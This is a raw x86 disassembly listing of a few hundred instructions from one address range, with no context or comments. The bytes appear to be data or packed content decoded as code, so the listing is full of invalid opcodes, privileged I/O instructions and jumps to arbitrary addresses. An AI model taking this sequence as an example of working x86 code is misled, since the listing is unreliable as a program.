  4338f2:	14 83                	adc    $0x83,%al
  4338f4:	87 c8                	xchg   %ecx,%eax
  4338f6:	c9                   	leave
  4338f7:	c9                   	leave
  4338f8:	78 51                	js     0x43394b
  4338fa:	e6 12                	out    %al,$0x12
  4338fc:	18 8b fc 21 c6 c4    	sbb    %cl,-0x3b39de04(%ebx)
  433902:	ae                   	scas   %es:(%edi),%al
  433903:	6d                   	insl   (%dx),%es:(%edi)
  433904:	1a d8                	sbb    %al,%bl
  433906:	14 00                	adc    $0x0,%al
  433908:	78 f3                	js     0x4338fd
  43390a:	73 f2                	jae    0x4338fe
  43390c:	26 34 72             	es xor $0x72,%al
  43390f:	d1 e1                	shl    $1,%ecx
  433911:	f4                   	hlt
  433912:	66 3c 31             	data16 cmp $0x31,%al
  433915:	14 f5                	adc    $0xf5,%al
  433917:	9a 17 70 73 00 d6 56 	lcall  $0x56d6,$0x737017
  43391e:	20 5b d8             	and    %bl,-0x28(%ebx)
  433921:	35 56 d8 e3 e8       	xor    $0xe8e3d856,%eax
  433926:	f1                   	int1
  433927:	61                   	popa
  433928:	c2 ca fb             	ret    $0xfbca
  43392b:	5a                   	pop    %edx
  43392c:	96                   	xchg   %eax,%esi
  43392d:	ff                   	(bad)
  43392e:	ba aa ae 13 83       	mov    $0x8313aeaa,%edx
  433933:	71 c1                	jno    0x4338f6
  433935:	2f                   	das
  433936:	2f                   	das
  433937:	74 03                	je     0x43393c
  433939:	f8                   	clc
  43393a:	f8                   	clc
  43393b:	c2 c0 b0             	ret    $0xb0c0
  43393e:	2e 11 20             	adc    %esp,%cs:(%eax)
  433941:	b7 a1                	mov    $0xa1,%bh
  433943:	38 de                	cmp    %bl,%dh
  433945:	1b c2                	sbb    %edx,%eax
  433947:	5b                   	pop    %ebx
  433948:	a1 71 63 82 89       	mov    0x89826371,%eax
  43394d:	80 47 2e 47          	addb   $0x47,0x2e(%edi)
  433951:	e1 62                	loope  0x4339b5
  433953:	ec                   	in     (%dx),%al
  433954:	21 71 7e             	and    %esi,0x7e(%ecx)
  433957:	2f                   	das
  433958:	35 2c 94 ed 53       	xor    $0x53ed942c,%eax
  43395d:	c3                   	ret
  43395e:	09 32                	or     %esi,(%edx)
  433960:	dc 29                	fsubrl (%ecx)
  433962:	e6 f8                	out    %al,$0xf8
  433964:	b0 2e                	mov    $0x2e,%al
  433966:	c4 54 48 18          	les    0x18(%eax,%ecx,2),%edx
  43396a:	dc 76 46             	fdivl  0x46(%esi)
  43396d:	71 4d                	jno    0x4339bc
  43396f:	dd 4a 50             	fisttpll 0x50(%edx)
  433972:	81 5d 4c 30 ce 28 68 	sbbl   $0x6828ce30,0x4c(%ebp)
  433979:	23 d9                	and    %ecx,%ebx
  43397b:	6c                   	insb   (%dx),%es:(%edi)
  43397c:	f2 21 0a             	repnz and %ecx,(%edx)
  43397f:	28 26                	sub    %ah,(%esi)
  433981:	ff a5 e8 af b9 3b    	jmp    *0x3bb9afe8(%ebp)
  433987:	2e 81 37 25 ff 43 38 	xorl   $0x3843ff25,%cs:(%edi)
  43398e:	6d                   	insl   (%dx),%es:(%edi)
  43398f:	64 3d 91 f8 bf 0c    	fs cmp $0xcbff891,%eax
  433995:	43                   	inc    %ebx
  433996:	b3 11                	mov    $0x11,%bl
  433998:	ee                   	out    %al,(%dx)
  433999:	c4                   	(bad)
  43399a:	cc                   	int3
  43399b:	b6 da                	mov    $0xda,%dh
  43399d:	b8 04 e9 22 7d       	mov    $0x7d22e904,%eax
  4339a2:	ce                   	into
  4339a3:	26 65 db 0a          	es fisttpl %gs:(%edx)
  4339a7:	69 62 dd b1 40 8d 46 	imul   $0x468d40b1,-0x23(%edx),%esp
  4339ae:	e4 c3                	in     $0xc3,%al
  4339b0:	f3 e9 c7 78 27 58    	repz jmp 0x586ab27d
  4339b6:	48                   	dec    %eax
  4339b7:	00 70 1f             	add    %dh,0x1f(%eax)
  4339ba:	78 94                	js     0x433950
  4339bc:	7d 81                	jge    0x43393f
  4339be:	63 fc                	arpl   %edi,%esp
  4339c0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4339c1:	87 e0                	xchg   %esp,%eax
  4339c3:	d1 3a                	sarl   $1,(%edx)
  4339c5:	fe c6                	inc    %dh
  4339c7:	ce                   	into
  4339c8:	cc                   	int3
  4339c9:	9e                   	sahf
  4339ca:	46                   	inc    %esi
  4339cb:	88 cf                	mov    %cl,%bh
  4339cd:	0e                   	push   %cs
  4339ce:	26 c3                	es ret
  4339d0:	09 b9 bc 0f 40 29    	or     %edi,0x29400fbc(%ecx)
  4339d6:	ad                   	lods   %ds:(%esi),%eax
  4339d7:	32 56 0b             	xor    0xb(%esi),%dl
  4339da:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4339db:	73 7c                	jae    0x433a59
  4339dd:	da 2a                	fisubrl (%edx)
  4339df:	24 5b                	and    $0x5b,%al
  4339e1:	1f                   	pop    %ds
  4339e2:	7b 09                	jnp    0x4339ed
  4339e4:	71 3e                	jno    0x433a24
  4339e6:	95                   	xchg   %eax,%ebp
  4339e7:	4e                   	dec    %esi
  4339e8:	e3 93                	jecxz  0x43397d
  4339ea:	94                   	xchg   %eax,%esp
  4339eb:	1a 93 e4 6e fe dd    	sbb    -0x2201911c(%ebx),%dl
  4339f1:	fb                   	sti
  4339f2:	80 7b 79 9b          	cmpb   $0x9b,0x79(%ebx)
  4339f6:	f1                   	int1
  4339f7:	1e                   	push   %ds
  4339f8:	11 91 d1 30 08 c4    	adc    %edx,-0x3bf7cf2f(%ecx)
  4339fe:	4e                   	dec    %esi
  4339ff:	8c d4                	mov    %ss,%esp
  433a01:	e9 d6 9c 26 d1       	jmp    0xd169d6dc
  433a06:	21 39                	and    %edi,(%ecx)
  433a08:	fc                   	cld
  433a09:	3f                   	aas
  433a0a:	09 98 bf df e5 d8    	or     %ebx,-0x271a2041(%eax)
  433a10:	04 1c                	add    $0x1c,%al
  433a12:	ae                   	scas   %es:(%edi),%al
  433a13:	8b 4e 81             	mov    -0x7f(%esi),%ecx
  433a16:	19 52 5b             	sbb    %edx,0x5b(%edx)
  433a19:	be 75 08 3a 2c       	mov    $0x2c3a0875,%esi
  433a1e:	f3 a2 88 f4 6b 2b    	repz mov %al,0x2b6bf488
  433a24:	23 ad 4f e0 ba a7    	and    -0x58451fb1(%ebp),%ebp
  433a2a:	2f                   	das
  433a2b:	8a 9c 5e 45 f7 4f 4c 	mov    0x4c4ff745(%esi,%ebx,2),%bl
  433a32:	4a                   	dec    %edx
  433a33:	c7                   	(bad)
  433a34:	5e                   	pop    %esi
  433a35:	9e                   	sahf
  433a36:	aa                   	stos   %al,%es:(%edi)
  433a37:	63 85 53 6c a7 9f    	arpl   %eax,-0x605893ad(%ebp)
  433a3d:	eb 4a                	jmp    0x433a89
  433a3f:	f1                   	int1
  433a40:	46                   	inc    %esi
  433a41:	3e a9 13 0b 1b 40    	ds test $0x401b0b13,%eax
  433a47:	69 ca 78 68 e8 d2    	imul   $0xd2e86878,%edx,%ecx
  433a4d:	ec                   	in     (%dx),%al
  433a4e:	34 1d                	xor    $0x1d,%al
  433a50:	01 ad 9a db c1 6a    	add    %ebp,0x6ac1db9a(%ebp)
  433a56:	31 f5                	xor    %esi,%ebp
  433a58:	7e fb                	jle    0x433a55
  433a5a:	6a f4                	push   $0xfffffff4
  433a5c:	e6 18                	out    %al,$0x18
  433a5e:	b1 3e                	mov    $0x3e,%cl
  433a60:	e2 db                	loop   0x433a3d
  433a62:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433a63:	50                   	push   %eax
  433a64:	b5 d7                	mov    $0xd7,%ch
  433a66:	10 ad e8 94 32 1c    	adc    %ch,0x1c3294e8(%ebp)
  433a6c:	08 04 39             	or     %al,(%ecx,%edi,1)
  433a6f:	4b                   	dec    %ebx
  433a70:	de 97 85 1f 5a 1d    	ficoms 0x1d5a1f85(%edi)
  433a76:	d9 30                	fnstenv (%eax)
  433a78:	32 e5                	xor    %ch,%ah
  433a7a:	28 0b                	sub    %cl,(%ebx)
  433a7c:	8b 1a                	mov    (%edx),%ebx
  433a7e:	5d                   	pop    %ebp
  433a7f:	4f                   	dec    %edi
  433a80:	87 19                	xchg   %ebx,(%ecx)
  433a82:	8b 93 8f 3a 20 92    	mov    -0x6ddfc571(%ebx),%edx
  433a88:	13 4f d1             	adc    -0x2f(%edi),%ecx
  433a8b:	54                   	push   %esp
  433a8c:	ab                   	stos   %eax,%es:(%edi)
  433a8d:	5a                   	pop    %edx
  433a8e:	14 85                	adc    $0x85,%al
  433a90:	7e e3                	jle    0x433a75
  433a92:	23 15 bb b8 70 c0    	and    0xc070b8bb,%edx
  433a98:	6b c9 b5             	imul   $0xffffffb5,%ecx,%ecx
  433a9b:	17                   	pop    %ss
  433a9c:	f4                   	hlt
  433a9d:	ab                   	stos   %eax,%es:(%edi)
  433a9e:	27                   	daa
  433a9f:	0f                   	movntps %xmm4,(bad)
  433aa0:	2b e4                	sub    %esp,%esp
  433aa2:	d9 5c a4 b5          	fstps  -0x4b(%esp,%eiz,4)
  433aa6:	e3 ad                	jecxz  0x433a55
  433aa8:	c1 9c 2e 7a a9 92 d3 	rcrl   $0x9e,-0x2c6d5686(%esi,%ebp,1)
  433aaf:	9e 
  433ab0:	90                   	nop
  433ab1:	03 9e c4 d9 62 a5    	add    -0x5a9d263c(%esi),%ebx
  433ab7:	2a 26                	sub    (%esi),%ah
  433ab9:	17                   	pop    %ss
  433aba:	32 2d 6d e6 5f 6c    	xor    0x6c5fe66d,%ch
  433ac0:	c2 8f 34             	ret    $0x348f
  433ac3:	fa                   	cli
  433ac4:	00 80 c9 d4 01 c6    	add    %al,-0x39fe2b37(%eax)
  433aca:	65 06                	gs push %es
  433acc:	c7                   	(bad)
  433acd:	d1 4b bc             	rorl   $1,-0x44(%ebx)
  433ad0:	f0 21 bb 7e 1e 66 15 	lock and %edi,0x15661e7e(%ebx)
  433ad7:	64 ab                	fs stos %eax,%es:(%edi)
  433ad9:	8c 71 91             	mov    %?,-0x6f(%ecx)
  433adc:	46                   	inc    %esi
  433add:	92                   	xchg   %eax,%edx
  433ade:	0d 3f ea e9 6d       	or     $0x6de9ea3f,%eax
  433ae3:	02 14 d1             	add    (%ecx,%edx,8),%dl
  433ae6:	ea 07 e3 03 72 5a f3 	ljmp   $0xf35a,$0x7203e307
  433aed:	fa                   	cli
  433aee:	a2 10 10 ee a2       	mov    %al,0xa2ee1010
  433af3:	3e 70 06             	jo,pt  0x433afc
  433af6:	30 e7                	xor    %ah,%bh
  433af8:	96                   	xchg   %eax,%esi
  433af9:	12 ce                	adc    %dh,%cl
  433afb:	8e 72 9a             	mov    -0x66(%edx),%?
  433afe:	d0 99 3f f3 50 17    	rcrb   $1,0x1750f33f(%ecx)
  433b04:	5c                   	pop    %esp
  433b05:	c6                   	(bad)
  433b06:	3d 85 44 57 7a       	cmp    $0x7a574485,%eax
  433b0b:	2a 21                	sub    (%ecx),%ah
  433b0d:	75 f9                	jne    0x433b08
  433b0f:	a9 3d e9 cb 4e       	test   $0x4ecbe93d,%eax
  433b14:	a8 ba                	test   $0xba,%al
  433b16:	ba 3b 12 7d 0b       	mov    $0xb7d123b,%edx
  433b1b:	d1 2c 98             	shrl   $1,(%eax,%ebx,4)
  433b1e:	58                   	pop    %eax
  433b1f:	75 d5                	jne    0x433af6
  433b21:	2b 40 12             	sub    0x12(%eax),%eax
  433b24:	e5 e1                	in     $0xe1,%eax
  433b26:	94                   	xchg   %eax,%esp
  433b27:	92                   	xchg   %eax,%edx
  433b28:	ed                   	in     (%dx),%eax
  433b29:	ae                   	scas   %es:(%edi),%al
  433b2a:	86 80 82 61 b1 ea    	xchg   %al,-0x154e9e7e(%eax)
  433b30:	91                   	xchg   %eax,%ecx
  433b31:	2f                   	das
  433b32:	d8 a9 c9 90 b8 99    	fsubrs -0x66476f37(%ecx)
  433b38:	c6                   	(bad)
  433b39:	af                   	scas   %es:(%edi),%eax
  433b3a:	ca 80 16             	lret   $0x1680
  433b3d:	61                   	popa
  433b3e:	5d                   	pop    %ebp
  433b3f:	9c                   	pushf
  433b40:	f2 2e 0f 2b 2e       	movntsd %xmm5,%cs:(%esi)
  433b45:	1b 03                	sbb    (%ebx),%eax
  433b47:	65 83 e3 50          	gs and $0x50,%ebx
  433b4b:	f1                   	int1
  433b4c:	2c 87                	sub    $0x87,%al
  433b4e:	bc 84 ad 23 e2       	mov    $0xe223ad84,%esp
  433b53:	db 11                	fistl  (%ecx)
  433b55:	5c                   	pop    %esp
  433b56:	c0 4c 71 52 ae       	rorb   $0xae,0x52(%ecx,%esi,2)
  433b5b:	ba e1 73 64 14       	mov    $0x146473e1,%edx
  433b60:	a9 bc 41 2e 6d       	test   $0x6d2e41bc,%eax
  433b65:	c0 a9 6c ba 76 ec 81 	shrb   $0x81,-0x13894594(%ecx)
  433b6c:	e5 c4                	in     $0xc4,%eax
  433b6e:	4e                   	dec    %esi
  433b6f:	87 5b ed             	xchg   %ebx,-0x13(%ebx)
  433b72:	2e c0 ab 9f 8d 5f 9f 	shrb   $0x93,%cs:-0x60a07261(%ebx)
  433b79:	93 
  433b7a:	06                   	push   %es
  433b7b:	8c 3f                	mov    %?,(%edi)
  433b7d:	55                   	push   %ebp
  433b7e:	8a ae 87 78 17 56    	mov    0x56177887(%esi),%ch
  433b84:	2a ac 88 21 25 e7 80 	sub    -0x7f18dadf(%eax,%ecx,4),%ch
  433b8b:	cf                   	iret
  433b8c:	69 ca 3f 84 7b 31    	imul   $0x317b843f,%edx,%ecx
  433b92:	59                   	pop    %ecx
  433b93:	a8 ea                	test   $0xea,%al
  433b95:	e7 08                	out    %eax,$0x8
  433b97:	d1 60 ef             	shll   $1,-0x11(%eax)
  433b9a:	b2 97                	mov    $0x97,%dl
  433b9c:	51                   	push   %ecx
  433b9d:	ea ee 02 e3 b0 49 64 	ljmp   $0x6449,$0xb0e302ee
  433ba4:	74 89                	je     0x433b2f
  433ba6:	7e 5f                	jle    0x433c07
  433ba8:	d4 4e                	aam    $0x4e
  433baa:	83 61 ae 53          	andl   $0x53,-0x52(%ecx)
  433bae:	88 80 05 6d 81 0d    	mov    %al,0xd816d05(%eax)
  433bb4:	08 13                	or     %dl,(%ebx)
  433bb6:	ca c1 6a             	lret   $0x6ac1
  433bb9:	35 ab 8f 43 51       	xor    $0x51438fab,%eax
  433bbe:	e5 15                	in     $0x15,%eax
  433bc0:	1c 45                	sbb    $0x45,%al
  433bc2:	ed                   	in     (%dx),%eax
  433bc3:	11 9a 5a b8 2c cd    	adc    %ebx,-0x32d347a6(%edx)
  433bc9:	14 b5                	adc    $0xb5,%al
  433bcb:	f9                   	stc
  433bcc:	7e b9                	jle    0x433b87
  433bce:	ab                   	stos   %eax,%es:(%edi)
  433bcf:	9d                   	popf
  433bd0:	14 ba                	adc    $0xba,%al
  433bd2:	ec                   	in     (%dx),%al
  433bd3:	20 62 a8             	and    %ah,-0x58(%edx)
  433bd6:	7f 37                	jg     0x433c0f
  433bd8:	db fb                	(bad)
  433bda:	bc 01 2d 63 2b       	mov    $0x2b632d01,%esp
  433bdf:	85 87 ff 28 79 9e    	test   %eax,-0x6186d701(%edi)
  433be5:	7a 27                	jp     0x433c0e
  433be7:	87 fa                	xchg   %edi,%edx
  433be9:	a9 12 24 ad 18       	test   $0x18ad2412,%eax
  433bee:	52                   	push   %edx
  433bef:	55                   	push   %ebp
  433bf0:	e7 31                	out    %eax,$0x31
  433bf2:	0a c0                	or     %al,%al
  433bf4:	f7 a3 d0 42 d2 25    	mull   0x25d242d0(%ebx)
  433bfa:	77 f5                	ja     0x433bf1
  433bfc:	03 a0 2f 20 c8 60    	add    0x60c8202f(%eax),%esp
  433c02:	75 47                	jne    0x433c4b
  433c04:	b8 6d 08 f9 f6       	mov    $0xf6f9086d,%eax
  433c09:	83 3d d0 c9 39 a9 ca 	cmpl   $0xffffffca,0xa939c9d0
  433c10:	96                   	xchg   %eax,%esi
  433c11:	da 6c 1e ae          	fisubrl -0x52(%esi,%ebx,1)
  433c15:	37                   	aaa
  433c16:	dd ed                	fucomp %st(5)
  433c18:	87 da                	xchg   %ebx,%edx
  433c1a:	ba 0b 6a 2a e1       	mov    $0xe12a6a0b,%edx
  433c1f:	08 f7                	or     %dh,%bh
  433c21:	1e                   	push   %ds
  433c22:	28 10                	sub    %dl,(%eax)
  433c24:	8a 65 44             	mov    0x44(%ebp),%ah
  433c27:	cf                   	iret
  433c28:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433c29:	d0 d1                	rcl    $1,%cl
  433c2b:	5f                   	pop    %edi
  433c2c:	46                   	inc    %esi
  433c2d:	44                   	inc    %esp
  433c2e:	ef                   	out    %eax,(%dx)
  433c2f:	b2 dc                	mov    $0xdc,%dl
  433c31:	81 fc 50 3f 01 c3    	cmp    $0xc3013f50,%esp
  433c37:	8c 83 6a 08 fc 97    	mov    %es,-0x6803f796(%ebx)
  433c3d:	8c 74 ca d7          	mov    %?,-0x29(%edx,%ecx,8)
  433c41:	28 12                	sub    %dl,(%edx)
  433c43:	b4 95                	mov    $0x95,%ah
  433c45:	00 7f 84             	add    %bh,-0x7c(%edi)
  433c48:	bd dc 69 b2 83       	mov    $0x83b269dc,%ebp
  433c4d:	e1 56                	loope  0x433ca5
  433c4f:	af                   	scas   %es:(%edi),%eax
  433c50:	1c f1                	sbb    $0xf1,%al
  433c52:	f2 90                	repnz nop
  433c54:	32 97 0b 4b 4c 27    	xor    0x274c4b0b(%edi),%dl
  433c5a:	84 b3 d2 d8 25 5f    	test   %dh,0x5f25d8d2(%ebx)
  433c60:	8d 85 38 ad 68 5b    	lea    0x5b68ad38(%ebp),%eax
  433c66:	50                   	push   %eax
  433c67:	a2 4c 0e dd 99       	mov    %al,0x99dd0e4c
  433c6c:	02 20                	add    (%eax),%ah
  433c6e:	43                   	inc    %ebx
  433c6f:	67 53                	addr16 push %ebx
  433c71:	92                   	xchg   %eax,%edx
  433c72:	43                   	inc    %ebx
  433c73:	c8 47 e0 93          	enter  $0xe047,$0x93
  433c77:	a2 f8 98 05 bd       	mov    %al,0xbd0598f8
  433c7c:	1d d3 b2 5c cc       	sbb    $0xcc5cb2d3,%eax
  433c81:	21 d9                	and    %ebx,%ecx
  433c83:	ba 35 aa f3 19       	mov    $0x19f3aa35,%edx
  433c88:	f3 f5                	repz cmc
  433c8a:	3c 70                	cmp    $0x70,%al
  433c8c:	33 f0                	xor    %eax,%esi
  433c8e:	7a e1                	jp     0x433c71
  433c90:	2d 4d be 52 84       	sub    $0x8452be4d,%eax
  433c95:	ea 28 06 c8 1f 6d ab 	ljmp   $0xab6d,$0x1fc80628
  433c9c:	15 ef fd ac 31       	adc    $0x31acfdef,%eax
  433ca1:	68 be aa b4 1a       	push   $0x1ab4aabe
  433ca6:	35 fd 40 8d 73       	xor    $0x738d40fd,%eax
  433cab:	6b 8a 44 56 c5 42 68 	imul   $0x68,0x42c55644(%edx),%ecx
  433cb2:	e1 e3                	loope  0x433c97
  433cb4:	af                   	scas   %es:(%edi),%eax
  433cb5:	77 fd                	ja     0x433cb4
  433cb7:	75 c9                	jne    0x433c82
  433cb9:	05 fb dc a2 c0       	add    $0xc0a2dcfb,%eax
  433cbe:	14 4e                	adc    $0x4e,%al
  433cc0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  433cc1:	28 f7                	sub    %dh,%bh
  433cc3:	ae                   	scas   %es:(%edi),%al
  433cc4:	5d                   	pop    %ebp
  433cc5:	13 9e 3d fe cd 3a    	adc    0x3acdfe3d(%esi),%ebx
  433ccb:	8b b1 18 9a 4e 97    	mov    -0x68b165e8(%ecx),%esi
  433cd1:	94                   	xchg   %eax,%esp
  433cd2:	6b 36 ca             	imul   $0xffffffca,(%esi),%esi
  433cd5:	6c                   	insb   (%dx),%es:(%edi)
  433cd6:	a9 9f aa 94 10       	test   $0x1094aa9f,%eax
  433cdb:	e8 42 70 f8 a4       	call   0xa53bad22
  433ce0:	ce                   	into
  433ce1:	78 63                	js     0x433d46
  433ce3:	bf c9 38 0f 42       	mov    $0x420f38c9,%edi
  433ce8:	1d d0 b5 26 39       	sbb    $0x3926b5d0,%eax
  433ced:	3b a8 7a c6 b4 2e    	cmp    0x2eb4c67a(%eax),%ebp
  433cf3:	02 9d e2 49 eb c0    	add    -0x3f14b61e(%ebp),%bl
  433cf9:	d0 0b                	rorb   $1,(%ebx)
  433cfb:	02 8b 84 90 a3 94    	add    -0x6b5c6f7c(%ebx),%cl
  433d01:	3a 2b                	cmp    (%ebx),%ch
  433d03:	52                   	push   %edx
  433d04:	cc                   	int3
  433d05:	db d6                	fcmovnbe %st(6),%st
  433d07:	50                   	push   %eax
  433d08:	ad                   	lods   %ds:(%esi),%eax
  433d09:	14 b8                	adc    $0xb8,%al
  433d0b:	96                   	xchg   %eax,%esi
  433d0c:	fd                   	std
  433d0d:	54                   	push   %esp
  433d0e:	ef                   	out    %eax,(%dx)
  433d0f:	15 44 eb c3 d8       	adc    $0xd8c3eb44,%eax
  433d14:	5d                   	pop    %ebp
  433d15:	15 7a 3f 5d e2       	adc    $0xe25d3f7a,%eax
  433d1a:	df e9                	fucomip %st(1),%st
  433d1c:	04 3a                	add    $0x3a,%al
  433d1e:	da 58 54             	ficompl 0x54(%eax)
  433d21:	ef                   	out    %eax,(%dx)
  433d22:	cf                   	iret
  433d23:	77 b0                	ja     0x433cd5
  433d25:	54                   	push   %esp
  433d26:	7e a8                	jle    0x433cd0
  433d28:	df 80 ac 5e 8e 21    	filds  0x218e5eac(%eax)
  433d2e:	21 9a 8b dc 0b 46    	and    %ebx,0x460bdc8b(%edx)
  433d34:	a1 5d d2 b6 f2       	mov    0xf2b6d25d,%eax
  433d39:	2b d3                	sub    %ebx,%edx
  433d3b:	19 9f 0e 49 63 c1    	sbb    %ebx,-0x3e9cb6f2(%edi)
  433d41:	43                   	inc    %ebx
  433d42:	36 a5                	movsl  %ss:(%esi),%es:(%edi)
  433d44:	79 27                	jns    0x433d6d
  433d46:	2e 6f                	outsl  %cs:(%esi),(%dx)
  433d48:	90                   	nop
  433d49:	e5 5a                	in     $0x5a,%eax
  433d4b:	fa                   	cli
  433d4c:	93                   	xchg   %eax,%ebx
  433d4d:	fa                   	cli
  433d4e:	4a                   	dec    %edx
  433d4f:	71 81                	jno    0x433cd2
  433d51:	f8                   	clc
  433d52:	87 96 11 06 99 c1    	xchg   %edx,-0x3e66f9ef(%esi)
  433d58:	33 9b 0c cb de af    	xor    -0x502134f4(%ebx),%ebx
  433d5e:	74 8e                	je     0x433cee
  433d60:	5d                   	pop    %ebp
  433d61:	33 b9 50 b2 29 06    	xor    0x629b250(%ecx),%edi
  433d67:	e5 9a                	in     $0x9a,%eax
  433d69:	54                   	push   %esp
  433d6a:	48                   	dec    %eax
  433d6b:	98                   	cwtl
  433d6c:	ae                   	scas   %es:(%edi),%al
  433d6d:	b0 e3                	mov    $0xe3,%al
  433d6f:	13 54 b0 f9          	adc    -0x7(%eax,%esi,4),%edx
  433d73:	0c 7a                	or     $0x7a,%al
  433d75:	87 d2                	xchg   %edx,%edx
  433d77:	cf                   	iret
  433d78:	cc                   	int3
  433d79:	4f                   	dec    %edi
  433d7a:	a9 9b ce 4a 20       	test   $0x204ace9b,%eax
  433d7f:	bf 71 6b ea 2e       	mov    $0x2eea6b71,%edi
  433d84:	9a 8d 3b 93 95 f0 21 	lcall  $0x21f0,$0x95933b8d
  433d8b:	2b 3e                	sub    (%esi),%edi
  433d8d:	79 23                	jns    0x433db2
  433d8f:	f1                   	int1
  433d90:	98                   	cwtl
  433d91:	41                   	inc    %ecx
  433d92:	58                   	pop    %eax
  433d93:	34 85                	xor    $0x85,%al
  433d95:	ea 7b e9 14 65 5b 7f 	ljmp   $0x7f5b,$0x6514e97b
  433d9c:	80 58 e4 67          	sbbb   $0x67,-0x1c(%eax)
  433da0:	21 6e ea             	and    %ebp,-0x16(%esi)
  433da3:	1c de                	sbb    $0xde,%al
  433da5:	c5 3c d2             	lds    (%edx,%edx,8),%edi
  433da8:	ad                   	lods   %ds:(%esi),%eax
  433da9:	b7 56                	mov    $0x56,%bh
  433dab:	fd                   	std
  433dac:	8d b7 32 2d 61 6d    	lea    0x6d612d32(%edi),%esi
  433db2:	55                   	push   %ebp
  433db3:	89 d1                	mov    %edx,%ecx
  433db5:	a8 7b                	test   $0x7b,%al
  433db7:	76 dd                	jbe    0x433d96
  433db9:	50                   	push   %eax
  433dba:	c4 75 18             	les    0x18(%ebp),%esi
  433dbd:	0f dd 89 61 34 1a 2c 	paddusw 0x2c1a3461(%ecx),%mm1
  433dc4:	e7 e4                	out    %eax,$0xe4
  433dc6:	34 8e                	xor    $0x8e,%al
  433dc8:	04 52                	add    $0x52,%al
  433dca:	eb 12                	jmp    0x433dde
  433dcc:	72 4c                	jb     0x433e1a
  433dce:	c6                   	(bad)
  433dcf:	0e                   	push   %cs
  433dd0:	2a 77 5d             	sub    0x5d(%edi),%dh
  433dd3:	e3 01                	jecxz  0x433dd6
  433dd5:	99                   	cltd
  433dd6:	ce                   	into
  433dd7:	4f                   	dec    %edi
  433dd8:	10 4c 64 ee          	adc    %cl,-0x12(%esp,%eiz,2)
  433ddc:	bd 38 27 76 d5       	mov    $0xd5762738,%ebp
  433de1:	2a 25 56 b6 25 43    	sub    0x4325b656,%ah
  433de7:	16                   	push   %ss
  433de8:	1a c6                	sbb    %dh,%al
  433dea:	ba cd 5c fd bd       	mov    $0xbdfd5ccd,%edx
  433def:	03 35 a2 da 87 65    	add    0x6587daa2,%esi
  433df5:	46                   	inc    %esi
  433df6:	b0 a2                	mov    $0xa2,%al
  433df8:	58                   	pop    %eax
  433df9:	97                   	xchg   %eax,%edi
  433dfa:	7f 1d                	jg     0x433e19
  433dfc:	60                   	pusha
  433dfd:	0d b4 4b 8a d5       	or     $0xd58a4bb4,%eax
  433e02:	bd 23 c9 1d 33       	mov    $0x331dc923,%ebp
  433e07:	40                   	inc    %eax
  433e08:	b4 39                	mov    $0x39,%ah
  433e0a:	af                   	scas   %es:(%edi),%eax
  433e0b:	54                   	push   %esp
  433e0c:	8e 20                	mov    (%eax),%fs
  433e0e:	e1 e1                	loope  0x433df1
  433e10:	69 9a 62 6f 4d e2 f4 	imul   $0xefd3cf4,-0x1db2909e(%edx),%ebx
  433e17:	3c fd 0e 
  433e1a:	42                   	inc    %edx
  433e1b:	87 67 f3             	xchg   %esp,-0xd(%edi)
  433e1e:	3b c0                	cmp    %eax,%eax
  433e20:	ed                   	in     (%dx),%eax
  433e21:	c2 19 b2             	ret    $0xb219
  433e24:	20 c1                	and    %al,%cl
  433e26:	21 f0                	and    %esi,%eax
  433e28:	90                   	nop
  433e29:	40                   	inc    %eax
  433e2a:	e0 c0                	loopne 0x433dec
  433e2c:	fc                   	cld
  433e2d:	82 93 d1 c4 dd ad a4 	adcb   $0xa4,-0x52223b2f(%ebx)
  433e34:	19 e4                	sbb    %esp,%esp
  433e36:	99                   	cltd
  433e37:	a9 c7 fc 83 6c       	test   $0x6c83fcc7,%eax
  433e3c:	ba 22 e1 95 6c       	mov    $0x6c95e122,%edx
  433e41:	56                   	push   %esi
  433e42:	79 db                	jns    0x433e1f
  433e44:	ef                   	out    %eax,(%dx)
  433e45:	f9                   	stc
  433e46:	ab                   	stos   %eax,%es:(%edi)
  433e47:	aa                   	stos   %al,%es:(%edi)
  433e48:	b3 83                	mov    $0x83,%bl
  433e4a:	e4 85                	in     $0x85,%al
  433e4c:	0d bf e1 57 8f       	or     $0x8f57e1bf,%eax
  433e51:	d8 79 49             	fdivrs 0x49(%ecx)
  433e54:	4c                   	dec    %esp
  433e55:	6f                   	outsl  %ds:(%esi),(%dx)
  433e56:	8e b7 54 35 54 bb    	mov    -0x44abcaac(%edi),%?
  433e5c:	55                   	push   %ebp
  433e5d:	3e 81 12 d9 59 35 86 	adcl   $0x863559d9,%ds:(%edx)
  433e64:	ea a7 b6 9c 02 75 67 	ljmp   $0x6775,$0x29cb6a7
  433e6b:	6a 61                	push   $0x61
  433e6d:	87 18                	xchg   %ebx,(%eax)
  433e6f:	87 f3                	xchg   %esi,%ebx
  433e71:	0c de                	or     $0xde,%al
  433e73:	93                   	xchg   %eax,%ebx
  433e74:	87 66 97             	xchg   %esp,-0x69(%esi)
  433e77:	ef                   	out    %eax,(%dx)
  433e78:	f6 1f                	negb   (%edi)
  433e7a:	58                   	pop    %eax
  433e7b:	3f                   	aas
  433e7c:	5a                   	pop    %edx
  433e7d:	03 07                	add    (%edi),%eax
  433e7f:	6a e9                	push   $0xffffffe9
  433e81:	42                   	inc    %edx
  433e82:	8e 81 33 14 07 1e    	mov    0x1e071433(%ecx),%es
  433e88:	26 94                	es xchg %eax,%esp
  433e8a:	89 85 9a 73 fc 9d    	mov    %eax,-0x62038c66(%ebp)
  433e90:	cd 37                	int    $0x37
  433e92:	8d 1b                	lea    (%ebx),%ebx
  433e94:	e8 a5 12 ac 51       	call   0x51ef513e
  433e99:	49                   	dec    %ecx
  433e9a:	3d f4 71 6b d6       	cmp    $0xd66b71f4,%eax
  433e9f:	bb 25 1a 46 cf       	mov    $0xcf461a25,%ebx
  433ea4:	37                   	aaa
  433ea5:	24 0c                	and    $0xc,%al
  433ea7:	41                   	inc    %ecx
  433ea8:	d4 eb                	aam    $0xeb
  433eaa:	43                   	inc    %ebx
  433eab:	e8 96 0f d0 68       	call   0x69134e46
  433eb0:	af                   	scas   %es:(%edi),%eax
  433eb1:	70 ac                	jo     0x433e5f
  433eb3:	1a 66 42             	sbb    0x42(%esi),%ah
  433eb6:	82 fb ad             	cmp    $0xad,%bl
  433eb9:	10 c8                	adc    %cl,%al
